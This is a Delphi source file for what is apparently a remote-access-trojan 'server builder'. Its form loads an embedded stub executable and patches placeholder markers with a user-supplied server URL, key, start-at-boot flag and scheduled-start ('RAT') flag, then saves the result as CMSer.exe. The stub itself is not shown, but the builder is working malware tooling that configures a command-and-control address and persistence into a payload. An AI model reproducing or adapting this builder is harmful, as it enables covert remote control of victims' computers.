unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls;

  function OffsetStream(mStream: TStream; mStr: string):Integer;
  function GetChecked(checked:bool):String;
  
type
  TSer = class(TForm)
    ShengCheng: TButton;
    Label1: TLabel;
    SerTip: TEdit;
    SerUrl: TEdit;
    SerRun: TCheckBox;
    Label2: TLabel;
    SerFil: TEdit;
    SerRat: TCheckBox;
    SerKey: TEdit;
    Label3: TLabel;
    Label4: TLabel;
    procedure ShengChengClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Ser: TSer;

implementation

{$R *.dfm}

procedure TSer.ShengChengClick(Sender: TObject);
var
  CMser:String;

  I:Integer;
  Num:Integer;
  //SerVal:array [0..3] of String;
  //SerTxt:array [0..3] of String;
  
  SerVal:array of String;
  SerTxt:array of String;

  ResoStr:TResourceStream;//资源流
  MemyStr:TmemoryStream;//内存流

  CmOffset:Integer;
  BufferS:Pchar;
begin

  Num:=5;

  SetLength(SerVal,Num+1);
  SetLength(SerTxt,Num+1);

  CMser:='CMser';  //文件名称
  CmOffset:=548268;  //初始化

  if SerUrl.Text='' then begin
	     showmessage('请先填写服务地址!');
	   end
  else
	   begin
     
       {锁住按钮}
       SerUrl.Enabled:=false;
       ShengCheng.Enabled:=false;

	     {创建内存流}
       MemyStr:=TmemoryStream.Create;
       {如果存在程序文件，读取文件流；否则读取资源流}
       if FileExists(CMser+'.dat') then begin
          MemyStr.LoadFromFile(CMser+'.dat');
          end
       else
          begin
          //将资源释放出来保存在内存流中;1,处理资源的模块2,资源标实,3资源类型
          ResoStr:=TResourceStream.Create(Hinstance,'ResFlag',RT_RCDATA);
          {将资源保存在内存流中修改}
          ResoStr.SaveToStream(MemyStr);
          ResoStr.Free;
       end;


       {运行提示消息}
       SerVal[0]:='{TIP}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';
       {服务网址url}
       SerVal[1]:='{URL}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';
       {是否创建新文件名称}
       SerVal[2]:='{FIL}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';
       {服务key}
       SerVal[3]:='{KEY}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';
       {是否开机启动}
       SerVal[4]:='{RUN}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';
       {是否计划启动}
       SerVal[5]:='{RAT}ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ';



       {去掉左右空格}
       SerTxt[0]:=Trim(SerTip.Text);
       SerTxt[1]:=Trim(SerUrl.Text);
       SerTxt[2]:=Trim(SerFil.Text);
       {服务key}
       SerTxt[3]:=Trim(SerKey.Text);
       {是否开机启动}
       SerTxt[4]:=GetChecked(SerRun.Checked);
       {是否开机启动}
       SerTxt[5]:=GetChecked(SerRat.Checked);

       

       //指向一字符串,字符串的内容为SerUrl.text和#0(代表空格) 空格的个数为7-后面的长
       for I:=0 to Num do
         begin
         BufferS:=pchar(SerTxt[I]+stringofchar(#0,length(SerVal[I])-length(SerTxt[I])));
         CmOffset:=OffsetStream(MemyStr,SerVal[I]); //地位要修改的字符串的位置,从头查找
         if CmOffset>0 then
         begin
            MemyStr.Seek(CmOffset,soFromBeginning);
            MemyStr.WriteBuffer(BufferS^,length(SerVal[I]));
         end
       end;

       {写入Urlbuffer中的数据,并向后移动7个字节位置,保存}
       MemyStr.SaveToFile('CMSer.exe');
       MemyStr.Free;
       Showmessage('服务端生成成功!');
       {解锁按钮}
       SerUrl.Enabled:=true;
       ShengCheng.Enabled:=true;
	end;
end;



function OffsetStream(mStream: TStream; mStr: string): Integer;
const
 cBufferSize = $8000;
var
 S: string;
 T: string;
 I: Integer;
 L: Integer;
begin
 Result := -1;
 if not Assigned(mStream) then Exit;
 if mStr = '' then Exit;
 L := Length(mStr);
 mStream.Position := 0;
 SetLength(S, cBufferSize);
 T := '';
 for I := 1 to mStream.Size div cBufferSize do begin
   mStream.Read(S[1], cBufferSize);
   Result := Pos(mStr, T + S) - 1;
   T := Copy(S, cBufferSize - L, MaxInt);
   if Result >= 0 then begin
     Result := Result + Pred(I) * cBufferSize - Length(T);
     Exit;
   end;
 end;
 I := mStream.Size mod cBufferSize;
 SetLength(S, I);
 if I > 0 then begin
   mStream.Read(S[1], I);
   Result := Pos(mStr, T + S) - 1;
   if Result >= 0 then begin
     Result := Result + mStream.Size - I - Length(T);
     Exit;
   end;
 end;
end; { ScanStream }


//判断是否已经点击
function GetChecked(checked:bool):String;
begin
  if checked then
     begin
       Result := 'Y';
     end
  else
     begin
       Result := 'N';
  end;
end;



end.
